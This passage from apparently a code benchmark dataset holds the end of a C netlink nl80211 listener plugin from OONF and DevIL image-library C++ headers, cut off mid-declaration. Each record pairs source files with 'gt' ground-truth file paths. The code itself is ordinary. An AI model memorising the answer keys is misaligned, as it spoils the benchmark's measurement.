 .dependencies_count = ARRAYSIZE(_dependencies),\n  .descr = \"OONF nl80211 listener plugin\",\n  .author = \"Henning Rogge\",\n\n  .cfg_section = &_nl80211_section,\n\n  .early_cfg_init = _early_cfg_init,\n  .init = _init,\n  .cleanup = _cleanup,\n};\nDECLARE_OONF_PLUGIN(_nl80211_listener_subsystem);\n\nenum oonf_log_source LOG_NL80211;\n\n\nstatic struct os_system_netlink _netlink_handler = {\n  .name = \"nl80211 listener\",\n  .used_by = &_nl80211_listener_subsystem,\n  .cb_message = _cb_nl_message,\n  .cb_error = _cb_nl_error,\n  .cb_done = _cb_nl_done,\n  .cb_timeout = _cb_nl_timeout,\n};\n\n\nstatic uint32_t _nl_msgbuffer[UIO_MAXIOV / 4];\nstatic struct nlmsghdr *_nl_msg = (void *)_nl_msgbuffer;\n\n\nstatic uint32_t _nl80211_id = 0;\nstatic uint32_t _nl80211_multicast_group = 0;\n\n\nstatic struct oonf_layer2_origin _layer2_updated_origin = {\n  .name = \"nl80211 updated\",\n  .proactive = true,\n  .priority = OONF_LAYER2_ORIGIN_RELIABLE + 1,\n};\nstatic struct oonf_layer2_origin _layer2_data_origin = {\n  .name = \"nl80211\",\n  .proactive = true,\n  .priority = OONF_LAYER2_ORIGIN_RELIABLE,\n};\n\n\nstatic struct nl80211_if *_current_query_if = NULL;\nstatic enum _if_query _current_query_number = QUERY_START;\nstatic bool _current_query_in_progress = false;\n\n\nstatic struct oonf_timer_class _transmission_timer_info = {\n  .name = \"nl80211 listener timer\",\n  .callback = _cb_transmission_event,\n  .periodic = true,\n};\n\nstatic struct oonf_timer_instance _transmission_timer = { .class = &_transmission_timer_info };\n\n\nstatic struct avl_tree _nl80211_if_tree;\n\nstatic struct oonf_class _nl80211_if_class = {\n  .name = \"nl80211 if\",\n  .size = sizeof(struct nl80211_if),\n};\n\nstatic const struct _nl80211_query _if_query_ops[QUERY_COUNT] = {\n  [QUERY_GET_IF] =\n    {\n      NL80211_CMD_NEW_INTERFACE,\n      nl80211_send_get_interface,\n      nl80211_process_get_interface_result,\n      NULL,\n    },\n  [QUERY_GET_WIPHY] =\n    {\n      NL80211_CMD_NEW_WIPHY,\n      nl80211_send_get_wiphy,\n      nl80211_process_get_wiphy_result,\n      nl80211_finalize_get_wiphy,\n    },\n  [QUERY_GET_SURVEY] =\n    {\n      NL80211_CMD_NEW_SURVEY_RESULTS,\n      nl80211_send_get_survey,\n      nl80211_process_get_survey_result,\n      NULL,\n    },\n  [QUERY_GET_MPP] =\n    {\n      NL80211_CMD_NEW_MPATH,\n      nl80211_send_get_mpp,\n      nl80211_process_get_mpp_result,\n      NULL,\n    },\n  [QUERY_GET_STATION] =\n    {\n      NL80211_CMD_NEW_STATION,\n      nl80211_send_get_station_dump,\n      nl80211_process_get_station_dump_result,\n      NULL,\n    },\n};\n\nstatic void\n_early_cfg_init(void) {\n  LOG_NL80211 = _nl80211_listener_subsystem.logging;\n}\n\n\nstatic int\n_init(void) {\n  if (os_system_linux_netlink_add(&_netlink_handler, NETLINK_GENERIC)) {\n    return -1;\n  }\n\n\n  oonf_class_add(&_nl80211_if_class);\n  avl_init(&_nl80211_if_tree, avl_comp_strcasecmp, false);\n\n\n  oonf_layer2_origin_add(&_layer2_updated_origin);\n  oonf_layer2_origin_add(&_layer2_data_origin);\n\n  oonf_timer_add(&_transmission_timer_info);\n  return 0;\n}\n\n\nstatic void\n_cleanup(void) {\n  struct nl80211_if *interf, *it_if;\n  avl_for_each_element_safe(&_nl80211_if_tree, interf, _node, it_if) {\n    _nl80211_if_remove(interf);\n  }\n  oonf_layer2_origin_remove(&_layer2_updated_origin);\n  oonf_layer2_origin_remove(&_layer2_data_origin);\n\n  oonf_timer_stop(&_transmission_timer);\n  oonf_timer_remove(&_transmission_timer_info);\n  os_system_linux_netlink_remove(&_netlink_handler);\n}\n\n\nstruct oonf_layer2_destination *\nnl80211_add_dst(struct oonf_layer2_neigh *l2neigh, const struct netaddr *dstmac) {\n  struct oonf_layer2_destination *dst;\n\n  dst = oonf_layer2_destination_add(l2neigh, dstmac, &_layer2_updated_origin);\n  if (dst->origin == &_layer2_data_origin) {\n    dst->origin = &_layer2_updated_origin;\n  }\n  return dst;\n}\n\n\nbool\nnl80211_change_l2net_data(struct oonf_layer2_net *l2net, enum oonf_layer2_network_index idx,\n    int64_t value, int64_t scaling) {\n  return oonf_layer2_data_set_int64(&l2net->data[idx], &_layer2_updated_origin,\n      oonf_layer2_net_metadata_get(idx), value, scaling);\n}\n\n\nbool\nnl80211_change_l2net_neighbor_default(\n  struct oonf_layer2_net *l2net, enum oonf_layer2_neighbor_index idx, int64_t value, int64_t scaling) {\n  return oonf_layer2_data_set_int64(&l2net->neighdata[idx], &_layer2_updated_origin,\n      oonf_layer2_neigh_metadata_get(idx), value, scaling);\n}\n\n\nvoid\nnl80211_cleanup_l2neigh_data(struct oonf_layer2_neigh *l2neigh) {\n  oonf_layer2_neigh_cleanup(l2neigh, &_layer2_data_origin);\n}\n\n\nbool\nnl80211_change_l2neigh_data(struct oonf_layer2_neigh *l2neigh, enum oonf_layer2_neighbor_index idx,\n    int64_t value, int64_t scaling) {\n  return oonf_layer2_data_set_int64(&l2neigh->data[idx], &_layer2_updated_origin,\n      oonf_layer2_neigh_metadata_get(idx), value, scaling);\n}\n\n\nbool\nnl80211_create_broadcast_neighbor(void) {\n  return _config.report_multicast_rate;\n}\n\n\nstatic struct nl80211_if *\n_nl80211_if_get(const char *name) {\n  struct nl80211_if *interf;\n\n  return avl_find_element(&_nl80211_if_tree, name, interf, _node);\n}\n\n\nstatic struct nl80211_if *\n_nl80211_if_add(const char *name) {\n  struct nl80211_if *interf;\n\n  interf = _nl80211_if_get(name);\n  if (interf) {\n    return interf;\n  }\n\n  interf = oonf_class_malloc(&_nl80211_if_class);\n  if (!interf) {\n    return NULL;\n  }\n\n\n  strscpy(interf->name, name, IF_NAMESIZE);\n  interf->_node.key = interf->name;\n\n\n  interf->l2net = oonf_layer2_net_add(interf->name);\n  if (!interf->l2net) {\n    oonf_class_free(&_nl80211_if_class, interf);\n    return NULL;\n  }\n\n  if (interf->l2net->if_type == OONF_LAYER2_TYPE_UNDEFINED) {\n    interf->l2net->if_type = OONF_LAYER2_TYPE_WIRELESS;\n  }\n\n\n  interf->if_listener.name = interf->name;\n  if (!os_interface_add(&interf->if_listener)) {\n    oonf_layer2_net_remove(interf->l2net, &_layer2_data_origin);\n    oonf_layer2_net_remove(interf->l2net, &_layer2_updated_origin);\n    oonf_class_free(&_nl80211_if_class, interf);\n    return NULL;\n  }\n\n\n  interf->wifi_phy_if = -1;\n\n  OONF_DEBUG(LOG_NL80211, \"Add if %s\", name);\n  avl_insert(&_nl80211_if_tree, &interf->_node);\n  return interf;\n}\n\n\nstatic void\n_nl80211_if_remove(struct nl80211_if *interf) {\n  avl_remove(&_nl80211_if_tree, &interf->_node);\n  os_interface_remove(&interf->if_listener);\n  oonf_class_free(&_nl80211_if_class, interf);\n}\n\n\nstatic void\n_cb_if_config_changed(void) {\n  struct nl80211_if *interf;\n  const char *ifname;\n  char ifbuf[IF_NAMESIZE];\n\n  ifname = cfg_get_phy_if(ifbuf, _if_section.section_name);\n  if (_if_section.pre == NULL) {\n    interf = _nl80211_if_add(ifname);\n    if (interf) {\n      interf->_if_section = true;\n    }\n  }\n\n  if (_if_section.post == NULL) {\n    interf = _nl80211_if_get(ifname);\n    if (interf) {\n      interf->_if_section = false;\n      if (!interf->_nl80211_section) {\n        _nl80211_if_remove(interf);\n      }\n    }\n  }\n}\n\n\nstatic void\n_cb_transmission_event(struct oonf_timer_instance *ptr __attribute__((unused))) {\n  if (!_current_query_in_progress) {\n    _trigger_next_netlink_query();\n  }\n}\n\n\nstatic void\n_send_netlink_message(struct nl80211_if *interf, enum _if_query query) {\n  struct genlmsghdr *hdr;\n\n  memset(&_nl_msgbuffer, 0, sizeof(_nl_msgbuffer));\n\n\n  _nl_msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct genlmsghdr));\n  _nl_msg->nlmsg_flags = NLM_F_REQUEST;\n\n\n  if (query == QUERY_GET_FAMILY) {\n\n    _nl_msg->nlmsg_type = GENL_ID_CTRL;\n  }\n  else {\n    _nl_msg->nlmsg_type = _nl80211_id;\n  }\n\n  hdr = NLMSG_DATA(_nl_msg);\n\n  if (query < QUERY_END) {\n    OONF_DEBUG(LOG_NL80211, \"Get query %d for interface %s\", query, interf->name);\n  }\n\n  if (query == QUERY_GET_FAMILY) {\n    genl_send_get_family(_nl_msg, hdr);\n  }\n  else if (_if_query_ops[query].send) {\n    _if_query_ops[query].send(&_netlink_handler, _nl_msg, hdr, interf);\n  }\n\n  os_system_linux_netlink_send(&_netlink_handler, _nl_msg);\n}\n\n\nstatic void\n_get_next_query(void) {\n  if (avl_is_empty(&_nl80211_if_tree)) {\n    OONF_DEBUG(LOG_NL80211, \"No nl80211 interfaces\");\n    _current_query_if = NULL;\n    return;\n  }\n\n\n  if (!_current_query_if) {\n\n    _current_query_if = avl_first_element(&_nl80211_if_tree, _current_query_if, _node);\n    _current_query_number = QUERY_START;\n    _current_query_in_progress = true;\n  }\n  else {\n\n    _current_query_number++;\n\n    if (_current_query_number == QUERY_END) {\n\n      if (_current_query_if->ifdata_changed) {\n\n        oonf_layer2_data_set_bool(\n          &_current_query_if->l2net->data[OONF_LAYER2_NET_MCS_BY_PROBING], &_layer2_updated_origin, NULL, true);\n\n\n        oonf_layer2_net_cleanup(_current_query_if->l2net, &_layer2_data_origin, true);\n        oonf_layer2_net_relabel(_current_query_if->l2net, &_layer2_data_origin, &_layer2_updated_origin);\n        oonf_layer2_net_commit(_current_query_if->l2net);\n        _current_query_if->ifdata_changed = false;\n      }\n\n      _current_query_if = avl_next_element_safe(&_nl80211_if_tree, _current_query_if, _node);\n      _current_query_number = QUERY_START;\n    }\n  }\n}\n\n\nstatic void\n_trigger_next_netlink_query(void) {\n  if (!_nl80211_id || !_nl80211_multicast_group) {\n    if (_current_query_in_progress) {\n\n      _current_query_in_progress = false;\n      return;\n    }\n\n\n    OONF_DEBUG(LOG_NL80211, \"Get nl80211 family and multicast id\");\n    _current_query_in_progress = true;\n    _send_netlink_message(NULL, QUERY_GET_FAMILY);\n    return;\n  }\n\n\n  do {\n    _get_next_query();\n  } while (_current_query_if && !_current_query_if->if_listener.data->flags.up);\n\n  if (!_current_query_if) {\n\n    OONF_INFO(LOG_NL80211, \"All queries done for all interfaces\");\n    _current_query_in_progress = false;\n    return;\n  }\n\n  OONF_INFO(LOG_NL80211, \"Sending query %u to interface %s\", _current_query_number, _current_query_if->name);\n  _send_netlink_message(_current_query_if, _current_query_number);\n}\n\n\nstatic void\n_cb_nl_message(struct nlmsghdr *hdr) {\n  struct genlmsghdr *gen_hdr;\n\n  gen_hdr = NLMSG_DATA(hdr);\n  if (hdr->nlmsg_type == GENL_ID_CTRL && gen_hdr->cmd == CTRL_CMD_NEWFAMILY) {\n    genl_process_get_family_result(hdr, &_nl80211_id, &_nl80211_multicast_group);\n    return;\n  }\n\n  if (hdr->nlmsg_type != _nl80211_id) {\n    OONF_WARN(LOG_NL80211, \"Unhandled netlink message type: %u\", hdr->nlmsg_type);\n    return;\n  }\n\n  if (gen_hdr->cmd != _if_query_ops[_current_query_number].cmd) {\n    OONF_INFO(LOG_NL80211, \"Received Nl80211 command %u for query %u (should be %u)\", gen_hdr->cmd,\n      _current_query_number, _if_query_ops[_current_query_number].cmd);\n  }\n  else if (_if_query_ops[_current_query_number].process) {\n    OONF_DEBUG(LOG_NL80211, \"Received Nl80211 command %u for query %u\", gen_hdr->cmd, _current_query_number);\n    _if_query_ops[_current_query_number].process(_current_query_if, hdr);\n  }\n}\n\n\nstatic void\n_cb_nl_error(uint32_t seq __attribute((unused)), int error __attribute((unused))) {\n  OONF_INFO(LOG_NL80211, \"seq %u: Received error %d\", seq, error);\n  if (_nl80211_id && _nl80211_multicast_group) {\n    _trigger_next_netlink_query();\n  }\n}\n\n\nstatic void\n_cb_nl_timeout(void) {\n  OONF_INFO(LOG_NL80211, \"Received timeout\");\n  if (_nl80211_id && _nl80211_multicast_group) {\n    if (_if_query_ops[_current_query_number].finalize) {\n      _if_query_ops[_current_query_number].finalize(_current_query_if);\n    }\n    _trigger_next_netlink_query();\n  }\n}\n\n\nstatic void\n_cb_nl_done(uint32_t seq __attribute((unused))) {\n  OONF_INFO(LOG_NL80211, \"%u: Received done\", seq);\n  if (_nl80211_id && _nl80211_multicast_group) {\n    if (_if_query_ops[_current_query_number].finalize) {\n      _if_query_ops[_current_query_number].finalize(_current_query_if);\n    }\n    _trigger_next_netlink_query();\n  }\n}\n\n\nstatic void\n_cb_config_changed(void) {\n  const struct const_strarray *array;\n  struct nl80211_if *interf;\n  const char *str;\n\n  if (cfg_schema_tobin(&_config, _nl80211_section.post, _nl80211_entries, ARRAYSIZE(_nl80211_entries))) {\n    OONF_WARN(LOG_NL80211, \"Could not convert \" OONF_NL80211_LISTENER_SUBSYSTEM \" config to bin\");\n    return;\n  }\n\n\n  oonf_timer_set_ext(&_transmission_timer, 1, _config.interval);\n\n\n  array = cfg_db_get_schema_entry_value(_nl80211_section.pre, &_nl80211_entries[IDX_INTERFACES]);\n  if (array && strarray_get_count_c(array) > 0) {\n    strarray_for_each_element(array, str) {\n      interf = _nl80211_if_get(str);\n      if (interf) {\n        interf->_remove = !interf->_if_section;\n        interf->_nl80211_section = false;\n      }\n    }\n  }\n\n\n  array = cfg_db_get_schema_entry_value(_nl80211_section.post, &_nl80211_entries[IDX_INTERFACES]);\n  if (array && strarray_get_count_c(array) > 0) {\n    strarray_for_each_element(array, str) {\n      interf = _nl80211_if_add(str);\n      if (interf) {\n\n        interf->_remove = false;\n        interf->_nl80211_section = true;\n      }\n    }\n  }\n\n  array = cfg_db_get_schema_entry_value(_nl80211_section.pre, &_nl80211_entries[IDX_INTERFACES]);\n  if (array && strarray_get_count_c(array) > 0) {\n    strarray_for_each_element(array, str) {\n      interf = _nl80211_if_get(str);\n      if (interf && interf->_remove) {\n        _nl80211_if_remove(interf);\n      }\n    }\n  }\n}\n",
        "gt": [
            "'OONF/include/oonf/generic/nl80211_listener/nl80211_listener.h'",
            "'OONF/include/oonf/generic/nl80211_listener/nl80211_get_mpp.h'",
            "'OONF/src/generic/nl80211_listener/nl80211_listener.c'"
        ]
    },
    {
        "files": [
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/IL/il_wrap.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/IL/ilut.h'",
            "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/IL/ilu.h'"
        ],
        "content": "'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/IL/il_wrap.h'\n:#ifndef WRAPPER_H\n#define WRAPPER_H\n\n\n#include <IL/ilut.h>\n\n#ifdef _MSC_VER\n\t#ifndef _IL_WRAP_BUILD_LIB\n\t\t#pragma comment(lib, \"il_wrap.lib\")\n\t#endif\n#endif\n\nclass ilImage\n{\npublic:\n\t\t\t\tilImage();\n\t\t\t\tilImage(char *);\n\t\t\t\tilImage(const ilImage &);\n\tvirtual\t\t~ilImage();\n\n\tILboolean\tLoad(char *);\n\tILboolean\tLoad(char *, ILenum);\n\tILboolean\tSave(char *);\n\tILboolean\tSave(char *, ILenum);\n\n\n\n\tILboolean\tActiveImage(ILuint);\n\tILboolean\tActiveLayer(ILuint);\n\tILboolean\tActiveMipmap(ILuint);\n\tILboolean\tClear(void);\n\tILvoid\t\tClearColour(ILclampf, ILclampf, ILclampf, ILclampf);\n\tILboolean\tConvert(ILenum);\n\tILboolean\tCopy(ILuint);\n\tILboolean\tDefault(void);\n\tILboolean\tFlip(void);\n\tILboolean\tSwapColours(void);\n\tILboolean\tResize(ILuint, ILuint, ILuint);\n\tILboolean\tTexImage(ILuint, ILuint, ILuint, ILubyte, ILenum, ILenum, ILvoid*);\n\n\n\n\tILvoid\t\tBind(void) const;\n\tILvoid\t\tBind(ILuint);\n\tILvoid\t\tClose(void) { this->Delete(); }\n\tILvoid\t\tDelete(void);\n\tILvoid\t\tiGenBind();\n\tILenum\t\tPaletteAlphaIndex();\n\n\n\tILuint\t\tWidth(void);\n\tILuint\t\tHeight(void);\n\tILuint\t\tDepth(void);\n\tILubyte\t\tBpp(void);\n\tILubyte\t\tBitpp(void);\n\tILenum\t\tPaletteType(void);\n\tILenum\t\tFormat(void);\n\tILenum\t\tType(void);\n\tILuint\t\tNumImages(void);\n\tILuint\t\tNumMipmaps(void);\n\tILuint\t\tGetId(void) const;\n        ILenum      GetOrigin(void);\n\tILubyte\t\t*GetData(void);\n\tILubyte\t\t*GetPalette(void);\n\n\n\n\tILuint\t\tBindImage(void);\n\tILuint\t\tBindImage(ILenum);\n\n\n\n\tilImage&\toperator = (ILuint);\n\tilImage&\toperator = (const ilImage &);\n\n\nprotected:\n\tILuint\t\tId;\n\nprivate:\n\tILvoid\t\tiStartUp();\n\n\n};\n\n\nclass ilFilters\n{\npublic:\n\tstatic ILboolean\tAlienify(ilImage &);\n\tstatic ILboolean\tBlurAvg(ilImage &, ILuint Iter);\n\tstatic ILboolean\tBlurGaussian(ilImage &, ILuint Iter);\n\tstatic ILboolean\tContrast(ilImage &, ILfloat Contrast);\n\tstatic ILboolean\tEdgeDetectE(ilImage &);\n\tstatic ILboolean\tEdgeDetectP(ilImage &);\n\tstatic ILboolean\tEdgeDetectS(ilImage &);\n\tstatic ILboolean\tEmboss(ilImage &);\n\tstatic ILboolean\tGamma(ilImage &, ILfloat Gamma);\n\tstatic ILboolean\tNegative(ilImage &);\n\tstatic ILboolean\tNoisify(ilImage &, ILubyte Factor);\n\tstatic ILboolean\tPixelize(ilImage &, ILuint PixSize);\n\tstatic ILboolean\tSaturate(ilImage &, ILfloat Saturation);\n\tstatic ILboolean\tSaturate(ilImage &, ILfloat r, ILfloat g, ILfloat b, ILfloat Saturation);\n\tstatic ILboolean\tScaleColours(ilImage &, ILfloat r, ILfloat g, ILfloat b);\n\tstatic ILboolean\tSharpen(ilImage &, ILfloat Factor, ILuint Iter);\n};\n\n\n#ifdef ILUT_USE_OPENGL\nclass ilOgl\n{\npublic:\n\tstatic ILvoid\t\tInit(void);\n\tstatic GLuint\t\tBindTex(ilImage &);\n\tstatic ILboolean\tUpload(ilImage &, ILuint);\n\tstatic GLuint\t\tMipmap(ilImage &);\n\tstatic ILboolean\tScreen(void);\n\tstatic ILboolean\tScreenie(void);\n};\n#endif\n\n\n#ifdef ILUT_USE_ALLEGRO\nclass ilAlleg\n{\npublic:\n\tstatic ILvoid\tInit(void);\n\tstatic BITMAP\t*Convert(ilImage &);\n};\n#endif\n\n\n#ifdef ILUT_USE_WIN32\nclass ilWin32\n{\npublic:\n\tstatic ILvoid\t\tInit(void);\n\tstatic HBITMAP\t\tConvert(ilImage &);\n\tstatic ILboolean\tGetClipboard(ilImage &);\n\tstatic ILvoid\t\tGetInfo(ilImage &, BITMAPINFO *Info);\n\tstatic ILubyte\t\t*GetPadData(ilImage &);\n\tstatic HPALETTE\t\tGetPal(ilImage &);\n\tstatic ILboolean\tGetResource(ilImage &, HINSTANCE hInst, ILint ID, char *ResourceType);\n\tstatic ILboolean\tGetResource(ilImage &, HINSTANCE hInst, ILint ID, char *ResourceType, ILenum Type);\n\tstatic ILboolean\tSetClipboard(ilImage &);\n};\n#endif\n\n\nclass ilValidate\n{\npublic:\n\tstatic ILboolean\tValid(ILenum, char *);\n\tstatic ILboolean\tValid(ILenum, FILE *);\n\tstatic ILboolean\tValid(ILenum, ILvoid *, ILuint);\n\nprotected:\n\nprivate:\n\n};\n\n\nclass ilState\n{\npublic:\n\tstatic ILboolean\t\tDisable(ILenum);\n\tstatic ILboolean\t\tEnable(ILenum);\n\tstatic ILvoid\t\t\tGet(ILenum, ILboolean &);\n\tstatic ILvoid\t\t\tGet(ILenum, ILint &);\n\tstatic ILboolean\t\tGetBool(ILenum);\n\tstatic ILint\t\t\tGetInt(ILenum);\n\tstatic const char\t\t*GetString(ILenum);\n\tstatic ILboolean\t\tIsDisabled(ILenum);\n\tstatic ILboolean\t\tIsEnabled(ILenum);\n\tstatic ILboolean\t\tOrigin(ILenum);\n\tstatic ILvoid\t\t\tPop(void);\n\tstatic ILvoid\t\t\tPush(ILuint);\n\n\nprotected:\n\nprivate:\n\n};\n\n\nclass ilError\n{\npublic:\n\tstatic ILvoid\t\tCheck(ILvoid (*Callback)(const char*));\n\tstatic ILvoid\t\tCheck(ILvoid (*Callback)(ILenum));\n\tstatic ILenum\t\tGet(void);\n\tstatic const char\t*String(void);\n\tstatic const char\t*String(ILenum);\n\nprotected:\n\nprivate:\n\n};\n\n\n#endif\n\n'assimp-Cpp-OpenGL-skeletal-animation/Load_3D_model_2/res/include/IL/ilut.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __ilut_h_\n#ifndef __ILUT_H__\n\n#define __ilut_h_\n#define __ILUT_H__\n\n#include <IL/il.h>\n#include <IL/ilu.h>\n\n\n\n\n\n\n#define ILUT_VERSION_1_8_0 1\n#define ILUT_VERSION       180\n\n\n\n#define ILUT_OPENGL_BIT      0x00000001\n#define ILUT_D3D_BIT         0x00000002\n#define ILUT_ALL_ATTRIB_BITS 0x000FFFFF\n\n\n\n#define ILUT_INVALID_ENUM        0x0501\n#define ILUT_OUT_OF_MEMORY       0x0502\n#define ILUT_INVALID_VALUE       0x0505\n#define ILUT_ILLEGAL_OPERATION   0x0506\n#define ILUT_INVALID_PARAM       0x0509\n#define ILUT_COULD_NOT_OPEN_FILE 0x050A\n#define ILUT_STACK_OVERFLOW      0x050E\n#define ILUT_STACK_UNDERFLOW     0x050F\n#define ILUT_BAD_DIMENSIONS      0x0511\n#define ILUT_NOT_SUPPORTED       0x0550\n\n\n\n#define ILUT_PALETTE_MODE         0x0600\n#define ILUT_OPENGL_CONV          0x0610\n#define ILUT_D3D_MIPLEVELS        0x0620\n#define ILUT_MAXTEX_WIDTH         0x0630\n#define ILUT_MAXTEX_HEIGHT        0x0631\n#define ILUT_MAXTEX_DEPTH         0x0632\n#define ILUT_GL_USE_S3TC          0x0634\n#define ILUT_D3D_USE_DXTC         0x0634\n#define ILUT_GL_GEN_S3TC          0x0635\n#define ILUT_D3D_GEN_DXTC         0x0635\n#define ILUT_S3TC_FORMAT          0x0705\n#define ILUT_DXTC_FORMAT          0x0705\n#define ILUT_D3D_POOL             0x0706\n#define ILUT_D3D_ALPHA_KEY_COLOR  0x0707\n#define ILUT_D3D_ALPHA_KEY_COLOUR 0x0707\n#define ILUT_FORCE_INTEGER_FORMAT 0x0636\n\n\n\n\n#define ILUT_GL_AUTODETECT_TEXTURE_TARGET 0x0807\n\n\n\n#define ILUT_VERSION_NUM IL_VERSION_NUM\n#define ILUT_VENDOR      IL_VENDOR\n\n\n#define ILUT_OPENGL     0\n#define ILUT_ALLEGRO    1\n#define ILUT_WIN32      2\n#define ILUT_DIRECT3D8  3\n#define\tILUT_DIRECT3D9  4\n#define ILUT_X11        5\n#define\tILUT_DIRECT3D10 6\n\n\n#if (defined(_WIN32) || defined(_WIN64))\n\t#if (defined(IL_USE_PRAGMA_LIBS)) && (!defined(_IL_BUILD_LIBRARY))\n\t\t#if defined(_MSC_VER) || defined(__BORLANDC__)\n\t\t\t#pragma comment(lib, \"ILUT.lib\")\n\t\t#endif\n\t#endif\n\n\t#include <IL/ilut_config.h>\n#endif\n\n\n\n\n\n\n\n\n#ifdef ILUT_USE_OPENGL\n\t#if defined(_MSC_VER) || defined(_WIN32)\n\n\t\t#include <windows.h>\n\t#endif\n\n\t#ifdef __APPLE__\n\t\t#include <OpenGL/gl.h>\n\t\t#include <OpenGL/glu.h>\n\t#else\n\t \t#include <GL/gl.h>\n \t\t#include <GL/glu.h>\n\t#endif\n#endif\n\n\n#ifdef ILUT_USE_WIN32\n\n\t#ifdef _DEBUG\n\t\t#define _CRTDBG_MAP_ALLOC\n\t\t#include <stdlib.h>\n\t\t#ifndef _WIN32_WCE\n\t\t\t#include <crtdbg.h>\n\t\t#endif\n\t#endif\n\t#include <windows.h>\n#endif\n\n\n\n\n\n\n\n\n\n\n#ifdef ILUT_USE_ALLEGRO\n\n#endif\n\n#ifdef ILUT_USE_SDL\n\n#endif\n\n#ifdef ILUT_USE_DIRECTX8\n\t#include <d3d8.h>\n#endif\n\n#ifdef ILUT_USE_DIRECTX9\n\t#include <d3d9.h>\n#endif\n\n#ifdef ILUT_USE_DIRECTX10\n\t#pragma warning(push)\n\t#pragma warning(disable : 4201)\n\t#include <rpcsal.h>\n\t#include <sal.h>\n\t#include <d3d10.h>\n\t#pragma warning(pop)\n#endif\n\n#ifdef ILUT_USE_X11\n\t#include <X11/Xlib.h>\n\t#include <X11/Xutil.h>\n#ifdef ILUT_USE_XSHM\n\t#include <sys/ipc.h>\n\t#include <sys/shm.h>\n\t#include <X11/extensions/XShm.h>\n#endif\n#endif\n\n\n\n\n\n\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nILAPI ILboolean\t\tILAPIENTRY ilutDisable(ILenum Mode);\nILAPI ILboolean\t\tILAPIENTRY ilutEnable(ILenum Mode);\nILAPI ILboolean\t\tILAPIENTRY ilutGetBoolean(ILenum Mode);\nILAPI void          ILAPIENTRY ilutGetBooleanv(ILenum Mode, ILboolean *Param);\nILAPI ILint\t\t\tILAPIENTRY ilutGetInteger(ILenum Mode);\nILAPI void          ILAPIENTRY ilutGetIntegerv(ILenum Mode, ILint *Param);\nILAPI ILstring      ILAPIENTRY ilutGetString(ILenum StringName);\nILAPI void          ILAPIENTRY ilutInit(void);\nILAPI ILboolean     ILAPIENTRY ilutIsDisabled(ILenum Mode);\nILAPI ILboolean     ILAPIENTRY ilutIsEnabled(ILenum Mode);\nILAPI void          ILAPIENTRY ilutPopAttrib(void);\nILAPI void          ILAPIENTRY ilutPushAttrib(ILuint Bits);\nILAPI void          ILAPIENTRY ilutSetInteger(ILenum Mode, ILint Param);\n\nILAPI ILboolean     ILAPIENTRY ilutRenderer(ILenum Renderer);\n\n\n\n#ifdef ILUT_USE_OPENGL\n\tILAPI GLuint\tILAPIENTRY ilutGLBindTexImage();\n\tILAPI GLuint\tILAPIENTRY ilutGLBindMipmaps(void);\n\tILAPI ILboolean\tILAPIENTRY ilutGLBuildMipmaps(void);\n\tILAPI GLuint\tILAPIENTRY ilutGLLoadImage(ILstring FileName);\n\tILAPI ILboolean\tILAPIENTRY ilutGLScreen(void);\n\tILAPI ILboolean\tILAPIENTRY ilutGLScreenie(void);\n\tILAPI ILboolean\tILAPIENTRY ilutGLSaveImage(ILstring FileName, GLuint TexID);\n\tILAPI ILboolean ILAPIENTRY ilutGLSubTex2D(GLuint TexID, ILuint XOff, ILuint YOff);\n\tILAPI ILboolean ILAPIENTRY ilutGLSubTex3D(GLuint TexID, ILuint XOff, ILuint YOff, ILuint ZOff);\n\tILAPI ILboolean\tILAPIENTRY ilutGLSetTex2D(GLuint TexID);\n\tILAPI ILboolean\tILAPIENTRY ilutGLSetTex3D(GLuint TexID);\n\tILAPI ILboolean\tILAPIENTRY ilutGLTexImage(GLuint Level);\n\tILAPI ILboolean ILAPIENTRY ilutGLSubTex(GLuint TexID, ILuint XOff, ILuint YOff);\n\n\tILAPI ILboolean\tILAPIENTRY ilutGLSetTex(GLuint TexID);\n\tILAPI ILboolean ILAPIENTRY ilutGLSubTex(GLuint TexID, ILuint XOff, ILuint YOff);\n#endif\n\n\n\n#ifdef ILUT_USE_ALLEGRO\n\t#ifdef __cplusplus\n\textern \"C\" {\n\t#endif\n\t\t#include <allegro.h>\n\t#ifdef __cplusplus\n\t}\n\t#endif\n\n\tILAPI BITMAP* ILAPIENTRY ilutAllegLoadImage(ILstring FileName);\n\tILAPI BITMAP* ILAPIENTRY ilutConvertToAlleg(PALETTE Pal);\n#endif\n\n\n\n#ifdef ILUT_USE_SDL\n\tILAPI struct SDL_Surface* ILAPIENTRY ilutConvertToSDLSurface(unsigned int flags);\n\tILAPI struct SDL_Surface* ILAPIENTRY ilutSDLSurfaceLoadImage(ILstring FileName);\n\tILAPI ILboolean    ILAPIENTRY ilutSDLSurfaceFromBitmap(struct SDL_Surface *Bitmap);\n#endif\n\n\n\n#ifdef  ILUT_USE_BEOS\n\tILAPI BBitmap ILAPIENTRY ilutConvertToBBitmap(void);\n#endif\n\n\n\n#ifdef ILUT_USE_WIN32\n\tILAPI HBITMAP\tILAPIENTRY ilutConvertToHBitmap(HDC hDC);\n\tILAPI HBITMAP\tILAPIENTRY ilutConvertSliceToHBitmap(HDC hDC, ILuint slice);\n\tILAPI void\tILAPIENTRY ilutFreePaddedData(ILubyte *Data);\n\tILAPI void\tILAPIENTRY ilutGetBmpInfo(BITMAPINFO *Info);\n\tILAPI HPALETTE\tILAPIENTRY ilutGetHPal(void);\n\tILAPI ILubyte*\tILAPIENTRY ilutGetPaddedData(void);\n\tILAPI ILboolean\tILAPIENTRY ilutGetWinClipboard(void);\n\tILAPI ILboolean\tILAPIENTRY ilutLoadResource(HINSTANCE hInst, ILint ID, ILstring ResourceType, ILenum Type);\n\tILAPI ILboolean\tILAPIENTRY ilutSetHBitmap(HBITMAP Bitmap);\n\tILAPI ILboolean\tILAPIENTRY ilutSetHPal(HPALETTE Pal);\n\tILAPI ILboolean\tILAPIENTRY ilutSetWinClipboard(void);\n\tILAPI HBITMAP\tILAPIENTRY ilutWinLoadImage(ILstring FileName, HDC hDC);\n\tILAPI ILboolean\tILAPIENTRY ilutWinLoadUrl(ILstring Url);\n\tILAPI ILboolean ILAPIENTRY ilutWinPrint(ILuint XPos, ILuint YPos, 